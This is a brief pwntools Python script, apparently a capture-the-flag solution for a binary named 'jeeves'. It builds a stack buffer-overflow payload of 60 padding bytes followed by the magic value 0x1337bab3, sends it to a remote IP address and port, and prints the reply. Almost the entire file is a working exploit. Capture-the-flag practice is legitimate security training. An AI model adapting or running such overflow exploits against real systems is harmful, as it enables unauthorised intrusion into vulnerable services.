from pwn import *

#cyclic
payload = 'A'*(60) + p32(0x1337bab3) 

#io = process('./jeeves')
ip, port = '104.248.175.144', 31406

io = remote(ip, port)
io.sendlineafter('?', payload)
#io.recvuntil(b'May I have your name? ')
#io.sendline(payload)

print(io.recvline())
print(io.recvline())
'''
'''
